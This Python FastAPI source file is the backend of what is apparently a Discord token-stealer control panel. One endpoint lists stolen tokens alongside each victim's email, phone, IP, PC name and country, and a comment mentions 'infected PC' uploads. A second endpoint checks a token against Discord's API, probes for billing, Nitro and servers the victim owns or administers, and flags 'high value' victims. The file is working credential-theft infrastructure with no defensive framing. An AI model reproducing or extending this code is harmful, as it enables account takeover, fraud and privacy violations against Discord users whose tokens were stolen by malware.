from typing import Any, List
from fastapi import APIRouter, Depends
from sqlalchemy.orm import Session
from app.api import deps
from app.core.database import get_db
from app.models.user import User, Token

router = APIRouter()

@router.get("/tokens")
def get_discord_tokens(
    db: Session = Depends(get_db),
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Get Discord tokens - each user only sees their own tokens"""
    query = db.query(Token)
    
    # IMPORTANT: Users only see their own tokens, admins see all
    if not current_user.is_admin:
        query = query.filter(Token.user_id == current_user.id)
    
    # Order by created_at DESC to show newest first
    tokens = query.order_by(Token.created_at.desc()).all()
    
    tokens_serialized = []
    seen_ids = set() # Use UserID to deduplicate and show only the latest status

    for token in tokens:
        import json
        metadata = {}
        if token.token_metadata:
            try:
                metadata = json.loads(token.token_metadata)
            except:
                pass
        
        # User ID from metadata
        user_id = metadata.get("id")
        
        # If we have seen this user_id before, skip (since we ordered by newest, first is newest)
        # Exception: If the newer one is INVALID but we have an older VALID one?
        # User said "token might be invalid... then new one comes". The new one should be prioritized.
        # But if new is Invalid (e.g. check failed) and old is Valid? 
        # Typically infected PC sends valid tokens. 
        # Let's trust the newest entry for a user_id as the "current state".
        
        if user_id:
            if user_id in seen_ids:
                continue
            seen_ids.add(user_id)

        # Calculate high value status
        guilds = metadata.get("guilds", [])
        is_high_value = False
        guild_count = len(guilds)
        high_value_guilds = []

        for g in guilds:
            # Check if owner and member count > 100 (approximate check if available)
            # Standard /users/@me/guilds only gives basic info (owner, permissions). 
            # It DOES NOT give member count directly unless we use bot or specialized fetch.
            # However, if we saved it from the client (Guardian), we might have it.
            # For now, let's flag "Owner" of ANY guild as potential, 
            # OR if we have explicit member counts from Guardian.
            try:
                perms = int(g.get("permissions", 0))
            except (ValueError, TypeError):
                perms = 0
            if g.get("owner", False) or (perms & 0x8): # Admin
                 high_value_guilds.append(g)
                 # If we have explicit member count (future proofing)
                 if g.get("approximate_member_count", 0) > 100:
                     is_high_value = True
        
        # If we don't have member counts, we can't strictly enforce >100. 
        # But we can flag "Owner" as interesting.
        # Logic: If Owner of > 0 guilds, mark as interesting.
        has_owner_guilds = any(g.get("owner") for g in guilds)

        tokens_serialized.append({
            "id": token.id,
            "token": token.token,
            "valid": token.is_valid,
            "username": metadata.get("username"),
            "discriminator": metadata.get("discriminator"),
            "email": metadata.get("email"),
            "user_id": metadata.get("id"),
            "avatar": metadata.get("avatar"),
            "has_nitro": metadata.get("has_nitro", False),
            "nitro_type": metadata.get("nitro_type"),
            "has_billing": metadata.get("has_billing", False),
            "mfa_enabled": metadata.get("mfa_enabled", False),
            "phone": metadata.get("phone"),
            "pc_name": metadata.get("pc_name", "Unknown"),
            "pc_user": metadata.get("pc_user", "Unknown"),
            "ip": metadata.get("ip", "Unknown"),
            "country": metadata.get("country", "Unknown"),
            "source": metadata.get("source", "direct"),
            "created_at": token.created_at.isoformat() if token.created_at else None,
            "guilds": guilds,
            "guild_count": len(guilds),
            "is_high_value": is_high_value or has_owner_guilds # For now, treat Owner as high value since member count isn't always there
        })
    
    return {"success": True, "tokens": tokens_serialized}

@router.post("/validate")
async def validate_token(
    token_data: dict,
    db: Session = Depends(get_db),
) -> Any:
    """Validate a Discord token with DB persistence"""
    import aiohttp
    import json
    
    token_str = token_data.get("token")
    if not token_str:
        return {"success": False, "error": "No token provided"}
    
    # Check DB to update it
    db_token = db.query(Token).filter(Token.token == token_str).first()
    
    # Validate Live
    try:
        async with aiohttp.ClientSession() as session:
            headers = {"Authorization": token_str}
            
            # 1. Get User Profile
            async with session.get("https://discord.com/api/v9/users/@me", headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    
                    # 2. Get Billing (Check if payments source exists)
                    has_billing = False
                    try:
                        async with session.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers) as billing_resp:
                            if billing_resp.status == 200:
                                billing_data = await billing_resp.json()
                                if len(billing_data) > 0:
                                    has_billing = True
                    except:
                        pass
                    
                    # 3. Get Guilds (Servers) and check for High Value
                    guilds = []
                    high_value_guilds = []
                    is_high_value = False
                    ADMIN_PERMISSION = 0x8  # Discord ADMINISTRATOR permission flag
                    
                    try:
                        async with session.get("https://discord.com/api/v9/users/@me/guilds", headers=headers) as guilds_resp:
                            if guilds_resp.status == 200:
                                guilds = await guilds_resp.json()
                                
                                # Check each guild for owner/admin status (no member count fetch to avoid rate limits)
                                for guild in guilds:
                                    is_owner = guild.get("owner", False)
                                    permissions = int(guild.get("permissions", 0))
                                    has_admin = (permissions & ADMIN_PERMISSION) == ADMIN_PERMISSION
                                    
                                    if is_owner or has_admin:
                                        guild["has_admin"] = has_admin
                                        guild["is_owner"] = is_owner
                                        high_value_guilds.append({
                                            "id": guild.get("id"),
                                            "name": guild.get("name"),
                                            "is_owner": is_owner,
                                            "has_admin": has_admin
                                        })
                                        is_high_value = True  # Owner or Admin in any guild = high value
                    except:
                        pass

                    # Determine Nitro
                    premium_type = data.get("premium_type", 0)
                    has_nitro = premium_type in [1, 2, 3]
                    nitro_label = "No Nitro"
                    if premium_type == 1: nitro_label = "Nitro Classic"
                    elif premium_type == 2: nitro_label = "Nitro"
                    elif premium_type == 3: nitro_label = "Nitro Basic"

                    user_data = {
                        "username": data.get("username"),
                        "discriminator": data.get("discriminator"),
                        "id": data.get("id"),
                        "email": data.get("email"),
                        "phone": data.get("phone"),
                        "avatar": data.get("avatar"),
                        "mfa_enabled": data.get("mfa_enabled", False),
                        "verified": data.get("verified", False),
                        "has_nitro": has_nitro,
                        "nitro_type": nitro_label if has_nitro else None,
                        "premium_type": premium_type,
                        "has_billing": has_billing,
                        "guilds": guilds,
                        "guild_count": len(guilds),
                        "is_high_value": is_high_value,
                        "high_value_guilds": high_value_guilds
                    }
                    
                    # Update DB
                    if db_token:
                        db_token.is_valid = True
                        try:
                            # Merge with existing so we don't lose PC info
                            existing_meta = json.loads(db_token.token_metadata or "{}")
                            existing_meta.update(user_data)
                            db_token.token_metadata = json.dumps(existing_meta)
                        except:
                            db_token.token_metadata = json.dumps(user_data)
                        db.commit()

                    return {
                        "success": True,
                        "valid": True,
                        "user": user_data
                    }
                elif resp.status == 401:
                    # Update DB as invalid
                    if db_token:
                        db_token.is_valid = False
                        db.commit()
                    return {"success": True, "valid": False, "error": "Invalid Token"}
                elif resp.status == 429:
                    return {"success": False, "error": "Rate Limited (Wait 5s)"}
                else:
                    return {"success": True, "valid": False, "error": f"HTTP {resp.status}"}
    except Exception as e:
        return {"success": False, "error": str(e)}
